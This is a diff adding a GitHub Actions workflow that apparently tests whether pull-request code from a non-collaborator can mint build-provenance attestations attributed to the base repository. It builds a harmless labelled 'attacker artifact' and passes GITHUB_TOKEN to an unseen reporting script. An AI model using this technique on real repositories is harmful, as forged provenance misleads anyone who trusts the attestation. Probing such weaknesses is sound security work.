@@ -1,0 +1,30 @@
+name: att
+on:
+  pull_request:
+  merge_group:
+permissions:
+  contents: read
+  id-token: write
+  attestations: write
+jobs:
+  att:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: make an attacker artifact
+        run: |
+          mkdir -p out
+          printf 'ATTACKER ARTIFACT - authored by a non-collaborator, never reviewed, built from %s run %s\n' \
+            "${GITHUB_EVENT_NAME}" "${GITHUB_RUN_ID}" > out/payload.bin
+          sha256sum out/payload.bin | tee out/digest.txt
+      - name: mint build provenance attributed to the BASE repo
+        id: attest
+        continue-on-error: true
+        uses: actions/attest-build-provenance@v2
+        with:
+          subject-path: out/payload.bin
+      - name: report
+        if: always()
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: bash .github/scripts/att.sh
